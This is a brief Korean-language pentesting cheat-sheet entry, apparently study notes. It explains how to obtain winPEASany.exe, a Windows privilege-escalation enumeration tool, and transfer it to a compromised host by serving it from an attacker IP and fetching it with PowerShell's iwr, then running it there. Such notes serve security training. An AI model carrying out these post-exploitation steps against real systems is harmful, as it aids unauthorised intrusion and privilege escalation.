> 무엇: Windows 권한 상승 벡터를 자동 점검하는 열거 도구 winPEASany.exe의 설치(peass 패키지·GitHub 릴리스)와 타깃 전송·실행 절차
> 언제: Windows 셸 확보 후 whoami /priv 같은 수동 확인으로 경로가 안 보일 때 서비스 설정·자동실행·크리덴셜 등 광범위한 privesc 힌트를 한 번에 긁을 때
> 조건: Kali에 peass 패키지(/usr/share/peass) 또는 GitHub에서 wget으로 준비, 타깃 전송은 iwr로 http.server 경유, 타깃에서 실행 권한 필요

> sudo apt update && sudo apt install peass
> /usr/share/peass

# latest

> wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe

```ps1
# python3 -m http.server 80
iwr -uri http://192.168.45.227:80/winPEASany.exe -Outfile winPEASany.exe
.\WinPEASany.exe
```
